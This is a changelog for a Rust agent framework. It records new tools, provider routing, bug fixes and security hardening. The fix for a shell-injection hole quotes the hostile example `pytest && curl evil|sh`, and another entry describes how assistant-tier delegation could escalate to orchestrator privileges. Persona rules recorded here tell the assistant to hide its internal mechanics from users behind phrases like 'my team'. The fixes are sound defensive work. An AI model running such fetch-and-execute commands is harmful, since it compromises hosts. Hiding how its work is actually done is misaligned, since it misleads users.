# Changelog

All notable changes are documented in this file.

Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).

---
## [Unreleased]

### Added

- **Agent context knows "now", "here", and "who" (#3469, epic #3052):** the
  `## User Context` block prefixed onto every tagent system prompt (PM, persona,
  and ctrl turns) now carries three things the model previously had to guess at,
  which matters for the weather / Metro-North tools that answer time- and
  location-sensitive questions. (1) A per-turn, timezone-aware date/time line
  with explicit day-of-week, rendered in the user's configured IANA zone via
  `chrono-tz` (falling back to UTC and saying so when the zone is missing or
  unparseable) — fixing the "hope your Sunday's going well" / "happy Monday!"
  drift from a once-computed timestamp. (2) An optional, user-supplied
  `location` profile field (`tagent config profile set --location`,
  `TAGENT_USER_LOCATION`, or the first-run interview; no IP geolocation, no
  inference from timezone, omitted entirely when unset). (3) An agent
  self-identification sentence built from the SAME resolved values used for the
  turn's real LLM dispatch (`creds.label()`, `agent.runner`, `agent.model`), so
  the persona can no longer claim "Anthropic's API" while actually running via
  OpenRouter. This change reconciles the self-identification decision-record
  that had drifted out of sync after PR #3461 (whose body declared the line
  descoped even though it shipped), documents the previously-undocumented
  `AgentIdentity` carrier, and records the whole capability under its tracking
  issue.

- **Izzie weather + Metro-North tools land as real platform-hosted tools
  (epic #3052):** the `izzie-weather` and `izzie-metro-north` skills named
  three tools — `get_weather`, `get_train_schedule`, `get_train_alerts` — that
  the persona advertised but that were never implemented, so the assistant
  could only refuse. All three now exist under `tools/izzie/`, are registered
  into the persona dispatch superset alongside git / ticketing / `system_status`,
  and are admitted by izzie's `[tools].allow`. `get_weather` returns current
  conditions + a short daily forecast (Open-Meteo) plus active US severe-weather
  alerts (NWS), keyless. `get_train_schedule` / `get_train_alerts` read the
  keyless MTA Metro-North GTFS-Realtime feed via a small dependency-free
  protobuf decoder, resolve station names to real GTFS stop_ids, and return the
  next departures (with assigned track and downstream arrival) / active service
  alerts as structured JSON in Eastern time. Any optional gateway credential is
  read from `MTA_API_KEY` with graceful degradation; the feed URL is overridable
  via `IZZIE_MNR_GTFS_RT_URL`.

- **Fireworks AI is reachable as an inference provider (#2410 Step 3, epic
  #2400):** `fireworks/<model>` now resolves to a dedicated
  `FireworksAdapter` (new `Provider::Fireworks` / `AuthSource::Fireworks`)
  instead of falling through to `GenericAdapter`, which unconditionally
  sent the request to OpenRouter carrying a Fireworks-native model id that
  OpenRouter does not recognize. The credential resolves through the same
  shared env > `.env.local` > secure-store resolver every other provider in
  this crate uses, the routing prefix is stripped before the request body is
  built (matching the `ollama/` treatment), and
  `reachable_today(ProviderId::Fireworks)` flips to `true`.
- **Missing-credential errors name the real provider:**
  `send_raw_completion` previously reported `"openrouter credential not
  found"` regardless of which adapter was actually in play; a Fireworks-routed
  call with no `FIREWORKS_API_KEY` now says so. The usage-log `runner` field
  likewise reports `"fireworks"` rather than defaulting to `"openrouter"`.

- **`dispatch_task` — the opaque tm<->tcode PM bridge tool (epic #3052, PR
  B, lane 3):** a new tool, distinct from lane 2's `delegate_to_agent`
  in-process sub-agent delegation, that routes a unit of work to either
  `tm` (orchestration / project / session / issue / PR / multi-agent work)
  or `tcode` (direct coding in a repo) via a deterministic, pure-function
  router (`intent::route::route_task`) — no LLM call, same input always
  routes the same way. The tool's name, schema, and results are fully
  black-boxed: neither backend's identity, nor `trusty-mpm`/`trusty-code`,
  is ever named in the schema, and the full backend transcript is run
  through `tools::pm_bridge::scrub_branding` (strips standalone
  `tm`/`tcode`/`trusty-mpm`/`trusty-code` tokens and redacts
  session-id-shaped artifacts) before returning, on both the success and
  error paths. RBAC-locked to deny `ServiceTier::ReadOnly` AND
  `ServiceTier::Analytics` — registered in the interactive assistant
  registry (`ctrl::pm_task::dispatch::history`) and the PM CLI registry
  (`runtime::pm_mode`), mirroring `delegate_to_agent`'s registration.
  Backend dispatch: `tcode` runs as a one-shot blocking subprocess
  (`tcode run-task pm <task> --project <dir> --json`), which itself blocks
  until its daemon-owned session reaches a terminal state; `tm` spawns
  `tm serve --stdio` and drives the managed-session lifecycle
  (`session_new` / `session_activity` / `session_decommission`) with a
  bounded poll, since tm has no synchronous "run this task headlessly"
  RPC (`agent_delegate` is explicitly a tracking/gating companion, NOT an
  execution path) — a documented MVP scope limit, flagged for a follow-up
  RPC.

### Fixed

- **A parallel phase could not fail when its merge failed (#3671):**
  `executor::dispatch` folded `ConflictResolver::merge`'s `Err` into a
  `"merge failed: ..."` string appended to the phase's content and returned
  `Ok(AgentOutput)` regardless. `merge()` only errors on a genuine I/O fault
  (`create_dir_all`/`read_dir`/`read`/`write`) — every recoverable conflict
  (a failed `git merge-file`, a failed LLM fallback) is already degraded to
  `Ok` with the reason recorded in the merge report. So a real `Err` meant the
  merged tree on disk was incomplete and nondeterministic (the collection
  loop walks a `HashMap` and can bail partway through), yet downstream phases
  consumed it as if it were whole, with the failure visible only as a buried
  string. `merge`'s `Err` now propagates as `WorkflowError::PhaseFailed`,
  failing the phase/workflow instead. Sibling of #3652/#3653/#3675 (the same
  "silent success" bug class).

### Security

- **`pytest_exec` (`ShellExecTool`) no longer executes through a shell (#3679):**
  the allowlist previously vetted only the command string's leading prefix,
  then handed the whole, unmodified string to `/bin/sh -c` — anything after
  the recognized prefix (`pytest && curl evil|sh`) was live shell syntax, a
  full arbitrary-command-execution hole in what's documented as the QA
  agent's sandbox. `resolve_allowed_argv()` now quote-aware tokenizes the
  command and requires the entire leading token sequence to exactly match a
  known test-runner invocation (whole-token comparison, never a string
  prefix, so `pytest-evil` cannot pass as `pytest`), and `execute()` runs the
  resolved argv directly via `Command::new(program).args(rest)` with no shell
  spawned at all — the actual fix, since any metacharacter that slipped
  through validation would now just be an inert argv element. A trailing
  `2>&1` (the one shell-redirection form the QA prompt emits) is stripped as
  a no-op carve-out rather than passed through a shell. Pre-existing on
  `main`, found during #3466 adversarial review and deliberately deferred to
  this dedicated fix.

- **Assistant no longer leaks internal orchestration or disclaims delegating
  when dispatched via `--direct`/`--agent` (#3550 follow-up):** a live smoke
  test (`tagent --direct assistant --task "..."`) proved the black-box/tool
  hardening from PR A (epic #3052, below) did NOT cover this dispatch path —
  it still leaked `trusty-mpm`, `subagent`, and `subprocess`, recited the
  entire bundled skill catalog ("wave planning", "git worktree discipline",
  the full engineering language/framework bench), and disclaimed delegating
  ("not a coding agent myself", "I'd hand off... rather than writing code
  myself"). Root cause: `--direct`/`--agent` route through `run_subagent`
  (`src/runtime/subagent_mode.rs`), a SEPARATE dispatch path from the
  persona-chat path (`run_pm_task_with_persona`) PR A actually hardened.
  `run_subagent` treated every agent — including `role == "assistant"`
  personas — as a generic coding sub-agent:
  - `SystemPromptBuilder::walk_project_instructions` unconditionally injected
    every ancestor `CLAUDE.md`/`AGENTS.md` verbatim, including this crate's
    own `CLAUDE.md` (which literally documents "PM Orchestrator", "Sub-Agent
    Process", "subprocess IPC") and the workspace root `CLAUDE.md`
    (`trusty-mpm`, worktree/PR-workflow conventions).
  - The binary's coding-harness protocol (`agents::harness_protocol::
    BASE_PROTOCOL` — "## trusty-agents Harness Protocol", `out_dir`,
    "workflow phases") was injected regardless of role, priming the model to
    describe itself as a phase-based coding harness.
  - `build_registry_for_agent`'s catch-all branch (`src/runtime/
    tool_registry.rs`) unconditionally wired `list_skills`/`load_skill` to
    the FULL tag-indexed skill registry (every language/framework/workflow
    skill, including `workflow/wave-planning.md` and `workflow/
    delegation.md`) with no restriction: `run_subagent_with_tools` gates
    tool reachability on `cfg.tools.allowed` (an exact-name list), but
    persona TOMLs declare `[tools].allow` (glob patterns) instead — a field
    this path never read — so `allowed` stayed `None`, which
    `chat_with_tools_gated` treats as unrestricted.

  Fixed with a role-scoped gate (`ASSISTANT_TIER_ROLE = "assistant"`,
  matches `AgentInfo.role` — covers `assistant`/`cto-assistant`/`izzie`/
  `personal-assistant` uniformly, independent of display name) in
  `run_subagent`: skips the CLAUDE.md walk and harness-protocol layers for
  assistant-tier agents, routes registry construction to a new curated
  `build_assistant_tier_registry` (delegation + read-only git/web lookups,
  no catalog-browsing tools), and adds `scope_assistant_allowed_tools` to
  translate `[tools].allow` glob patterns into the `[tools].allowed`
  exact-name list the existing gate enforces. Engineer/qa/research/docs/ops/
  plan/pm/ctrl dispatch is untouched — the gate only fires for
  `role == "assistant"`.

  `assistant/persona.md`, `izzie.toml`, and `personal-assistant.toml`'s
  "What you are not — Not a coding agent" sections were reworded from an
  identity-negation frame (which the model was echoing near-verbatim as
  "I'm not a coding agent myself") to a positive delegation-ownership frame
  ("you own getting it done, by delegating it") that explicitly forbids the
  disclaiming phrasing.

  New tests: `assistant_tier_registry_excludes_skill_catalog_tools`,
  `assistant_tier_registry_includes_curated_tools`,
  `role_takes_precedence_over_name_for_assistant_tier`,
  `scope_assistant_allowed_tools_filters_by_glob`,
  `scope_assistant_allowed_tools_noop_for_non_assistant`,
  `scope_assistant_allowed_tools_noop_when_allowed_already_set`
  (`src/runtime/tool_registry_tests.rs`).

- **`delegate_to_agent` no longer leaks internal agent names (PR A code-critic
  fix, epic #3052):** granting `delegate_to_agent` to assistant-tier personas
  (see below) exposed two leaks in the shared tool implementation
  (`src/tools/delegate.rs`), sent to the LLM on every turn / every failed
  delegation regardless of caller:
  - The tool's schema `description` hardcoded concrete internal agent-name
    examples (`'engineer', 'python-engineer', 'qa-agent'`) — generalized to
    describe the parameter generically ("the specialist to hand this task
    to"). `pm` is unaffected: it gets its roster via its own system prompt's
    `{{available_agents}}` template substitution
    (`agents::registry::roster::inject_roster_into_prompt`), independent of
    this schema.
  - An unknown `agent_name` returned "Unknown agent 'x'. Available agents:
    &lt;full on-disk roster&gt;." — the roster enumeration is now dropped;
    the error just names the caller's own rejected input ("'x' is not a
    recognized specialist. Check your own instructions...") without
    enumerating the config directory. The now-unused `available_agents()`
    roster-listing helper was removed.
  - **Functional companion fix:** the black-box strip left the assistant
    with `delegate_to_agent` but no idea which `agent_name` values are
    legitimate. `assistant/persona.md` gains a curated "Internal specialist
    routing" list — `engineer`, `python-engineer`, `qa-agent`,
    `research-agent`, `docs-agent`, `local-ops-agent`, `plan-agent` (the
    general-purpose WORKER agents; excludes meta/infra agents `ctrl`/`pm`/
    `observe-agent`/`postmortem-agent` and model-variant engineers
    `bedrock-engineer`/`claude-code-engineer`/`code-agent`/`gpt-engineer`/
    `gpt5-codex-engineer`) — marked explicitly as internal-only knowledge:
    the assistant may use these names to decide who to call, but must refer
    to the user only by role ("an engineer", "a QA specialist"), never by
    the internal name. The same list + the full black-box "NEVER reveal
    internal mechanics" section were ported into the two shadow-fallback
    files (`izzie.toml`, `cto-assistant.toml`) that previously got the tool
    grant + mcp-strip but not the black-box prose; `personal-assistant.toml`
    (no `delegate_to_agent` grant, doesn't `extend` `assistant`) gets a
    scope-note comment instead, documenting the deferral rather than leaving
    it ambiguous.
  - **Bug found + fixed along the way:** `izzie/agent.toml`'s
    `extends = "assistant"` key was placed BEFORE the `[agent]` table
    header, making it a top-level TOML key. `AgentConfig` has no top-level
    `extends` field (only `AgentInfo::extends`) and doesn't
    `deny_unknown_fields`, so serde silently dropped it — `izzie` never
    actually inherited anything from the base (no prose concatenation, no
    tool/skill union) despite every comment in the file claiming otherwise;
    it "worked" only because izzie's own redundant declarations happened to
    duplicate the base's values. Moved `extends` inside `[agent]`, where the
    schema expects it — caught by a new pinning test that failed exactly
    because the base's persona body (this PR's routing list) never reached
    izzie's resolved content.
  - New/updated tests: `unknown_agent_is_rejected_without_naming_the_agent_or_roster`
    (`src/tools/delegate.rs`, invokes `DelegateToAgentTool::execute()` with a
    bad name against a config dir seeded with a realistic worker + meta/infra
    roster, asserts none of it leaks),
    `assistant_tier_persona_carries_curated_worker_routing_list`
    (`src/agents/tests/loading.rs`, resolves `assistant`/`izzie`/
    `cto-assistant` and asserts the routing list + black-box reminder are
    present), and `izzie_overlay_package_parses_with_personal_deltas`
    corrected to assert the NOW-CORRECT real-inheritance behavior (it
    previously asserted the absence of inheritance, which was the bug).

### Fixed

- **Parallel-phase conflict resolution no longer silently truncates files to
  zero bytes when `git merge-file` fails (#3652):**
  `ConflictResolver::resolve_conflict` read the merge subprocess's stdout
  while ignoring its exit status. `git merge-file` signals three distinct
  outcomes through one integer — `0` clean, `1..=127` conflict count, and
  anything above that a git *error* — and on error it prints nothing. So any
  condition that broke git's repository discovery (corrupt worktree,
  `safe.directory` "dubious ownership" refusal, a stale `GIT_DIR`) produced
  empty stdout, which the marker scan then read as a clean merge, and the
  resolver wrote a zero-byte file over both sub-agents' work. Exit status is
  now decided explicitly by the pure `decide_merge_bytes`, a git failure
  degrades to first-agent-wins instead of to an empty file, and byte-identical
  versions short-circuit before git is spawned at all — so merging N copies of
  the same file is a true no-op regardless of the ambient git environment.
- **The same zero-byte truncation on the LLM resolution path — the *default*
  production path — is fixed (#3652 follow-up, review of #3653):**
  `llm_resolve` did `resp["choices"][0]["message"]["content"].as_str()
  .unwrap_or("")`. `reqwest`'s `send()` does not error on 4xx/5xx (that needs
  `error_for_status()`), and OpenRouter's error payload is well-formed JSON,
  so an expired key (401), a rate limit (429), an out-of-credits 402, or an
  empty `choices` array all parsed cleanly, extracted to `""`, and were
  written over both agents' work. This branch runs whenever an OpenRouter key
  is configured — which `executor::dispatch` resolves by default — so every
  genuine conflict went through it, and its triggers are routine. It also had
  zero test coverage, because the existing tests passed an empty API key
  specifically to disable it. `llm_resolve` now calls `error_for_status()?`
  and parses through `extract_llm_content`, which requires a non-blank
  `content` string and returns `Err` otherwise, so the caller degrades to a
  real version. Regression tests drive a local HTTP stub through 401/402/429/
  500 and a 200-with-no-choices.
- **The non-empty invariant is now enforced structurally at one seam rather
  than trusted per branch:** `resolve_conflict` routes every branch's result
  through the pure `enforce_non_empty`, which rejects an empty resolution for
  non-empty input and degrades to the first agent's full version. A future
  resolution path therefore cannot truncate a file even if it forgets the
  rule. Genuinely empty agent output is still passed through unchanged.
- **Degraded conflict resolution is no longer reported as a successful merge
  (review of #3653):** `merge()` stamped `[MERGED from a+b]` and counted
  `Conflicts resolved: N` identically whether the bytes came from a real
  structural merge, an LLM merge, or first-agent-wins after git or the LLM
  failed — and that report is the only channel downstream phases read
  (`executor::dispatch` appends it to the phase's `AgentOutput`; the
  `tracing::warn!` goes to a log nobody downstream reads). Resolution mode is
  now recorded per file and rendered distinctly — `[MERGED from a+b]`,
  `[LLM-MERGED from a+b]`, `[DEGRADED from a+b] … kept 'a', discarded the
  rest (reason)` — the summary splits into `conflicts: N (merged: X,
  degraded: Y)`, and any degradation puts a `!! DEGRADED` block at the top of
  the report. Report line ordering is now sorted, so it is reproducible
  across runs despite `HashMap` iteration order.
- **Flaky `HOME`-race unit tests in `skills::sources::tests` fixed (#3607):**
  `remote_git_without_subdir_uses_cache_dir_directly` and its siblings
  `remote_git_cache_path_computed_correctly` /
  `sources_resolved_paths_expands_tilde` each called `dirs::home_dir()`
  twice — once implicitly inside `SkillSourceRegistry::resolved_paths()`,
  once directly to build the expected value — without holding
  `test_env::HOME_LOCK`, so a concurrent test's `$HOME` sandboxing could
  change the value in between the two calls under `cargo test`'s default
  multi-threaded runner. All three now hold `HOME_LOCK` for their full
  body, matching the crate-wide convention documented in `test_env.rs`.
- **`gworkspace` OpenRPC endpoint no longer silently discovers zero tools
  (#3577):** `DirectDriver::discover()` deserialized `rpc.discover`'s raw
  result directly into `EndpointManifest`, which expected a top-level
  `tools` array; every real server (`trusty-memory`, `trusty-search`,
  `trusty-gworkspace`) actually emits standard OpenRPC's `methods` array.
  Because `EndpointManifest.tools` carried `#[serde(default)]`, the shape
  mismatch deserialized successfully with `tools: vec![]` instead of
  erroring — the `gworkspace` endpoint (enabled by default since #3056)
  contributed zero tools in production with no error anywhere. New
  `discovery::parse_manifest` recognizes the real `methods` shape (and the
  legacy `tools` shape), converts each OpenRPC method into a
  `DiscoveredTool` (JSON Schema `input_schema`/`output_schema`
  reconstructed from `params[]`/`result.schema`), and resolves scope from
  `x-scopes` (dotted string, used as-is) or `x-google-scopes` (OAuth URLs,
  mapped to a dotted scope via the new `google_scope` module — classified
  by what the OAuth grant permits, not by today's per-tool behavior). A
  payload with neither `methods` nor `tools` now returns a hard error
  naming the endpoint and the keys actually present, instead of silently
  producing an empty tool list; a manifest that parses successfully but
  advertises zero tools now logs a loud warning naming the endpoint.
  `default-config.toml`'s gworkspace endpoint scopes gained
  `google.slides.*` and `google.accounts.*`, without which the Slides and
  local-account-management tools would parse but then be dropped by scope
  filtering.
- **Bundled agent templates now refresh automatically when the binary's embedded content changes, instead of freezing at whatever was deployed on first run (#3556).** `agents::bundled::deploy_bundled_agents` has always been a strict "write missing files only" deploy — `ensure_bundled_agents_deployed` (run once per process from `runtime::startup::run_startup_init`) called it unconditionally, so a machine that deployed the bundled roster once NEVER picked up a later binary's changes to those same templates. Concretely: PR-A's `delegate_to_agent` grant added to the base `assistant` agent never reached a machine that already had the old `assistant/agent.toml` on disk — the assistant silently declined to delegate, and the only fix was a human manually deleting the stale file. Root cause fixed via a version-stamped reprovision pass:
  - A new `agents::bundled::stamp` module computes a stable SHA-256 content hash over the embedded bundle's `(path, bytes)` set and persists it as `$HOME/.trusty-agents/agents/.bundled-stamp`.
  - `ensure_bundled_agents_deployed` now compares the current binary's stamp to the on-disk one; a missing or mismatched stamp triggers a refresh pass that rewrites exactly the bundled files whose content actually differs from the current embedded template — every other bundled file (already up to date) and every NON-bundled (user-authored) file are left completely untouched, since the refresh only ever iterates the embedded bundle's own relative paths.
  - Before overwriting a bundled file whose on-disk content differs from the incoming template (e.g. a user hand-edited it, or it's genuinely stale), the existing content is archived to a sibling `<file>.stale.bak` first, so it's always recoverable — but ONLY when that backup doesn't already exist, so a later pass can never clobber a genuine prior backup with torn or already-refreshed content.
  - Added an explicit manual escape hatch, `tagent agents repair`, that force-refreshes every bundled file regardless of the stamp (`tagent agents deploy` also gained the same stamp-aware refresh behavior it previously lacked).
  - Concurrency (code-critic follow-up, HIGH): `delegate_to_agent` routinely spawns a fresh `tagent` subprocess per delegation, so multiple processes can enter the stale-stamp refresh path concurrently right after a binary upgrade. Every write in `agents::bundled` (per-file overwrite, backup, and the stamp file) now goes through `state_writer::atomic_write` (tmp-file + rename, reusing the same `fs4`-based primitive the crate already uses for state files) instead of a plain truncate-then-write, and a new `agents::bundled::lock` module takes a SINGLE pass-level advisory lock for the whole `reprovision_bundled_agents` read-backup-write loop, so two concurrent passes over the same target directory are fully serialized rather than interleaving per-file decisions.
  - Concurrency, part 2 (code-critic follow-up, MEDIUM): the first pass acquired that lock only INSIDE the refresh loop, leaving the stamp `read`/is-stale-decide/`write` sequence in `ensure_bundled_agents_deployed_in` and `force_reprovision_bundled_agents` outside it — two concurrent callers could both read the same old stamp, both refresh, then race writing the stamp back (self-healing on the next launch, but not actually the fully-serialized invariant intended). The loop body moved into a new `reprovision_bundled_agents_locked`, which REQUIRES an already-held lock guard as a parameter; `ensure_bundled_agents_deployed_in` and `force_reprovision_bundled_agents` now acquire the lock ONCE, before `stamp::read`, and hold it across the entire read-decide-refresh-write sequence.
  - `crates/trusty-agents/src/agents/bundled.rs` was split into `agents/bundled/{mod.rs, stamp.rs, lock.rs, tests.rs}` to keep the new logic under the crate's 500-SLOC production-file cap.
  - Regression coverage: `deployed_assistant_config_survives_scoping_with_delegate_to_agent` (`runtime/tool_registry_tests.rs`) seeds a genuinely STALE `assistant/agent.toml` (an old allow-list without `delegate_to_agent`) plus a wrong stamp into a tempdir, drives the REAL refresh path (`ensure_bundled_agents_deployed_in`), then resolves the refreshed config via `AgentConfig::by_name` and the real assistant-tier registry, asserting `delegate_to_agent` survives `scope_assistant_allowed_tools` — this sequence fails on pre-#3556 code, closing the exact deployed-config-to-registry-scoping gap that silently lost the grant. `agents::bundled::tests` adds `stale_stamp_triggers_refresh`, `refresh_backs_up_differing_content`, `existing_stale_backup_is_never_clobbered`, `non_bundled_user_file_untouched_by_refresh`, `matching_stamp_is_a_fast_noop`, `missing_stamp_establishes_baseline_without_rewriting_matching_content`, `force_reprovision_overwrites_even_when_stamp_matches`, `concurrent_ensure_calls_over_stale_target_converge_to_one_consistent_refresh` (races 6 threads' full `ensure_bundled_agents_deployed_in` calls over one seeded-stale target, asserting exactly one performs the refresh and every other observes a fully-consistent no-op), and `ensure_deployed_blocks_on_externally_held_pass_lock` (proves `stamp::read` itself is now behind the lock, by holding it externally and asserting a concurrent call cannot proceed until release); `agents::bundled::lock::tests` adds `pass_lock_serializes_concurrent_reprovision_calls`.

- **Test-isolation cluster: env-var and CWD races between concurrently-running tests (issues #3398, #3516).**
  - `ctrl/tests/tools_tests.rs`'s `detect_self_project_finds_via_env_var` / `detect_self_project_returns_none_when_no_marker` used to mutate the process-global `TAGENT_PROJECT_DIR` env var directly, with no `#[serial]` guard — but `workflow::engine::executor::tests::checkpoint_resume` mutates the SAME var under its own `#[serial]` convention, so the unguarded pair could clobber it mid-flight and produce a `CheckpointNotFound` failure in a completely unrelated test (#3398). `ctrl::util::detect_self_project` now delegates to a new `detect_self_project_with_hint(Option<&str>)`; the tests call the hinted version directly, so no env var is touched at all.
  - `telegram::tests::tempdir_for_test` hand-rolled tempdir "uniqueness" from `std::process::id()` (constant across every thread of one test binary) plus a nanosecond timestamp, which can collide under very high `--test-threads` if two threads sample the same clock tick — silently sharing one `telegram.pid` fixture between two of the `telegram_pid_guard_*` tests (#3516). Now uses `tempfile::tempdir()`, which guarantees a collision-free unique directory.
  - `default_bundled_config_dir`'s legacy-migration test (`env_compat.rs`) used to `std::env::set_current_dir` into a scratch tempdir under `#[serial]` — but CWD is process-global exactly like an env var, and `api::server::tests` handler tests resolve their own CWD-relative paths (`.trusty-agents/projects`, `.trusty-agents/agents`) while holding a *different* lock (`HOME_LOCK`), so `#[serial]` alone did not protect them from this CWD swap. `default_bundled_config_dir` now delegates to a new `default_bundled_config_dir_checking(&Path)` that roots its existence checks at an explicit parameter; the test points it at a tempdir directly, so no CWD mutation occurs at all.
  - Verified with the full `trusty-agents` lib suite run repeatedly at `--test-threads=64` and `128` (9 full runs total) with zero failures in `checkpoint_resume`, `telegram_pid_guard_*`, `get_project_config_falls_back_to_registry_when_toml_missing`, or `gather_specs_does_not_spawn_mcp_add_discover_bypass` — not proof the underlying rare flakes (#3514, #3516's second sub-issue) are fully eliminated, but no regression observed either.

- **Assistant can now actually delegate to bundled worker agents (`engineer`,
  `qa-agent`, …) regardless of the invoking CWD (#3555 follow-up):** a live
  run (`tagent --direct assistant --task "have an engineer run cargo check
  and report back"`) proved `delegate_to_agent` always failed with
  `is_error=true` and no `engineer` sub-agent was ever spawned, whenever the
  assistant was launched from a directory with no local
  `.trusty-agents/agents/` of its own (a bare worktree root, `/tmp`, …) — the
  model honestly reported "no engineering agent is wired up right now."
  Root cause: `build_assistant_tier_registry`
  (`src/runtime/tool_registry.rs`) built `delegate_to_agent`'s pre-flight
  validation directory as a single, hand-rolled
  `<cwd>/.trusty-agents/agents` — invisible to the bundled worker roster
  `agents::bundled::ensure_bundled_agents_deployed` deploys to
  `$HOME/.trusty-agents/agents/` at every startup. `AgentConfig::by_name`
  (used by the actual spawn) already resolves through
  `agents_dir_candidates()` — CWD/`TAGENT_CONFIG_DIR` tier, THEN the `$HOME`
  fallback — so validation rejected names the spawn would have happily
  found, killing the delegate call before the runner was ever invoked.
  - `DelegateToAgentTool` (`src/tools/delegate.rs`) now validates against a
    `Vec<PathBuf>` of candidate directories (`with_config_dirs`) instead of a
    single `Option<PathBuf>`, checked via the new `agents::agent_name_resolves`
    predicate (package/flat-toml/flat-md tiers — the same tiers the loader's
    `by_name_unresolved_src_in` uses). `with_config_dir` (single dir) is kept
    unchanged for `pm`/`ctrl`, which intentionally validate against exactly
    one project-scoped roster.
  - `build_assistant_tier_registry` now sources its directories from the
    newly crate-visible `agents::agents_dir_candidates()` — the SAME
    multi-tier list `AgentConfig::by_name` resolves against — so validation
    and the actual spawn can never diverge again.
  - Observability: `delegate_to_agent`'s pre-flight rejection and any
    sub-agent run error are now logged at `debug` with the actual failure
    reason (`src/tools/delegate.rs`); the tool-loop's per-call log
    (`src/llm/tool_loop/mod.rs`) now includes the error content on failure
    instead of only `is_error=true` with no payload — previously a failing
    `delegate_to_agent` call was undebuggable at any log level.
  - New tests: `delegate_resolves_agent_from_secondary_config_dir` and
    `delegate_rejects_agent_absent_from_all_config_dirs`
    (`src/tools/delegate.rs`); `agent_name_resolves_tests::*`
    (`src/agents/tests/loading.rs`) pin the three resolution tiers plus the
    negative/traversal cases.
  - Live-verified end-to-end (`RUST_LOG=debug`, CWD = bare worktree root with
    no local `.trusty-agents/agents/`): `delegate_to_agent` dispatches with
    `is_error=false`, a real `agent=engineer` sub-agent spawns and completes,
    and the assistant relays the engineer's actual `cargo check` findings.
  - **`agent_name_resolves` edge-case fix (code-critic MEDIUM):** the real
    resolver (`AgentConfig::by_name_in`, via `load_agent_package`'s `?`) hard
    -aborts the ENTIRE search the moment `<dir>/<name>/` exists as a
    directory without a readable `agent.toml`/`persona.md` inside it — it
    does NOT fall through to a flat `<name>.toml` in a later directory.
    `agent_name_resolves` previously kept scanning in that case (a
    `.iter().any(...)` over all dirs), so validation could accept a name the
    real spawn then hard-errors on. Rewrote it as an explicit per-`dir` loop
    that mirrors the same short-circuit: on the first `<dir>/<name>/`
    directory hit, it returns immediately based on whether BOTH
    `agent.toml` and `persona.md` are present, exactly like the real
    resolver either resolves or aborts right there. New pinning test
    `agent_name_resolves_tests::short_circuits_on_malformed_directory_package_matching_real_resolver`
    proves both `agent_name_resolves` and `AgentConfig::by_name_in` agree in
    the same scenario. (Known, documented, deliberately-deferred limitation:
    `agent_name_resolves` still doesn't check the legacy
    `~/.claude/agents`/`<cwd>/.claude/agents` claude-mpm-format tier the real
    resolver's final fallback searches — never affects the bundled roster
    `delegate_to_agent` actually targets, since every bundled agent lives
    under the `.trusty-agents/agents` tiers this function does check.)

### Security

- **CRITICAL — privilege escalation via unrestricted assistant-tier
  delegation target, closed with a fail-closed role allowlist (#3555
  follow-up, code-critic):** widening `delegate_to_agent`'s pre-flight
  validation to the full `agents_dir_candidates()` multi-tier search (the fix
  directly above) had an unreviewed consequence — it made the ENTIRE bundled
  roster resolvable from an assistant-tier call regardless of cwd, including
  `pm` (role `orchestrator`), `ctrl` (role `controller`), `observe-agent`
  (role `observer`), and `postmortem-agent`/`analysis-agent` (role
  `analysis`). `run_subagent`'s tool registry is built from the SPAWNED
  child's own role, so an assistant delegating to `pm`/`ctrl` would have
  handed the resulting subprocess an UNRESTRICTED orchestrator/controller
  registry (shell, `write_file`, unrestricted `delegate_to_agent`) — an
  escalation straight out of the sandboxed assistant tier, reopening the
  internal-orchestration-leak class PR A (epic #3052) closed.
  - `DelegateToAgentTool` (`src/tools/delegate.rs`) gained
    `allowed_target_roles: Option<Vec<String>>` and a
    `with_allowed_target_roles` builder. When set, `execute()` resolves the
    TARGET's `AgentConfig` (via `config_dirs`) and requires its resolved
    `agent.role` to be in the allowlist — checked BEFORE the runner is ever
    invoked. Both "unknown agent name" and "role not allowed" return the
    IDENTICAL generic error text, so neither leaks which case occurred or any
    role taxonomy. `pm`/`ctrl` never call this builder — the full roster
    remains a legitimate delegation target for them, completely unaffected.
  - `build_assistant_tier_registry` (`src/runtime/tool_registry.rs`) now
    wires a new `ASSISTANT_ALLOWED_DELEGATE_ROLES` constant: the exact `role`
    field values of the bundled worker agents (`engineer`, `qa`,
    `researcher`, `documentation`, `ops`, `planner`) plus `ASSISTANT_TIER_ROLE`
    itself — so the Izzie ↔ cto-assistant peer-consult lane keeps working
    (spawning a peer assistant is safe: it's routed through the SAME
    restricted `build_assistant_tier_registry`, never an unrestricted one).
    Any other role — orchestrator, controller, observer, analysis, or
    anything undeclared — is rejected.
  - New tests: `delegate_assistant_role_gate_rejects_orchestrator_role`,
    `delegate_assistant_role_gate_rejects_controller_role`,
    `delegate_assistant_role_gate_allows_worker_role`,
    `delegate_assistant_role_gate_allows_peer_assistant_role`, and
    `delegate_without_role_gate_allows_any_resolvable_role` (pins that
    pm/ctrl are unaffected) — all in `src/tools/delegate.rs`. A `#[ignore]`d
    live-wiring test, `runtime::tool_registry::registry_tests::
    live_assistant_registry_rejects_pm_role`, exercises the REAL
    `build_assistant_tier_registry()` against whatever roster is actually
    deployed at `$HOME/.trusty-agents/agents/` (manual verification aid, not
    a CI gate — CI's `$HOME` may have no deployed roster at all).
  - Live-verified: the REAL production registry (built from the machine's
    actual deployed `$HOME/.trusty-agents/agents/pm.toml`, role
    `orchestrator`) rejects `delegate_to_agent(agent_name="pm")` without
    invoking the runner, while a real `engineer` delegation still spawns and
    completes normally.

### Changed

- **Assistant delegates to specialists + peers; black-boxes internal tooling
  (PR A, epic #3052):** the base `assistant` agent (and every persona built
  on it — `izzie`, `cto-assistant`, `personal-assistant`) can now actually
  get hands-on engineering/QA/research work done. `assistant/agent.toml`
  gains `delegate_to_agent` in `[tools].allow` (native, in-process
  tagent→tagent delegation via `src/tools/delegate.rs`, already wired into
  persona dispatch by `filter_persona_tool_names` — only the grant was
  missing). `izzie` and `cto-assistant` both declare `extends = "assistant"`
  and inherit the grant automatically (`[tools].allow` is unioned base-first
  by `crate::agents::extends::merge_extends`, #3055/#3106).
  `assistant/persona.md` softens the old "redirect coding to engineering
  agents" framing to "bring in the right specialist and relay the outcome",
  adds a peer consult-and-relay capability (assistant instances may consult
  each other and summarize the input, staying in control of the
  conversation), and adds a BLACK-BOX rule: never say "tm", "tcode",
  "trusty-mpm", "trusty-code", "PM session", "subprocess", "sub-agent", or
  "subagent" to the user — describe outcomes via "a specialist" / "my team",
  never internal mechanics or system/daemon names. `cto-assistant/agent.toml`
  is refactored from a hand-forked full copy (`role = "assistant"`, no
